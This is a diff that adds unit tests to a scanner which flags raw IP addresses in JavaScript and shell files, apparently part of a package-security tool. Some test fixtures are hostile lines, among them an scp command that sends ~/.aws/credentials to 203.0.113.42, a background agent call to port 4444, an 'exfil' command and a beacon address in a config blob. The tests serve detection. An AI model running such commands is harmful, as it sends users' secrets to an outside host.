@@ -356,3 +356,45 @@ test("a publisher email change alone corroborates but does not warn by itself", 
   expect(email?.action).toBeUndefined();
   expect(signals.reduce((sum, signal) => sum + signal.weight, 0)).toBeLessThan(25);
 });
+
+const kinds = (findings: Array<{ kind: string }>) => findings.map((f) => f.kind);
+
+test("svg path data is geometry, not a network address", () => {
+  const icon = [
+    'const Lightbulb = [["path",{',
+    '  d: "M15 14c.2-1 .7-1.7 1.5-2.5 1-.9 1.5-2.2 1.5-3.5A6 6 0 0 0 6 8c0 1 .2 2.2 1.5 3.5.7.7 1.3 1.5 1.5 2.5"',
+    "}]];",
+    "export { Lightbulb as default };",
+  ].join("\n");
+  expect(kinds(scanJs(icon))).not.toContain("raw_ip");
+});
+
+test("geometry with exponent notation and negative coordinates is still geometry", () => {
+  expect(kinds(scanJs('const d = "M0 0L1e-3 2.5.7.7-1.3z";'))).not.toContain("raw_ip");
+});
+
+test("an address is not excused by sitting next to numbers", () => {
+  expect(kinds(scanJs('const c2 = "203.0.113.42 4444";'))).toContain("raw_ip");
+  expect(kinds(scanJs('const c2 = "  203.0.113.42  ";'))).toContain("raw_ip");
+  expect(kinds(scanJs('const peers = ["203.0.113.42"];'))).toContain("raw_ip");
+});
+
+test("an install script that hands an address to any binary is still caught", () => {
+  expect(kinds(scanShell("scp -q ~/.aws/credentials 203.0.113.42:/tmp/c"))).toContain("raw_ip");
+  expect(kinds(scanShell("./bin/agent 203.0.113.42 4444 &"))).toContain("raw_ip");
+  expect(kinds(scanShell("sh -c 'exfil --to 203.0.113.42 --now'"))).toContain("raw_ip");
+  expect(kinds(scanShell("echo 203.0.113.42 >> ~/.config/.peer"))).toContain("raw_ip");
+});
+
+test("a config blob carrying a command and control address is still caught", () => {
+  expect(kinds(scanJs('{"config":{"beacon":"203.0.113.42"}}'))).toContain("raw_ip");
+});
+
+test("private and loopback ranges stay excluded", () => {
+  for (const address of ["127.0.0.1", "10.0.0.1", "192.168.0.1", "172.16.0.1", "169.254.1.1"])
+    expect(kinds(scanJs(`const h = "${address}";`))).not.toContain("raw_ip");
+});
+
+test("an octet above the legal range is not an address at all", () => {
+  expect(kinds(scanJs('const v = "999.1.1.1";'))).not.toContain("raw_ip");
+});
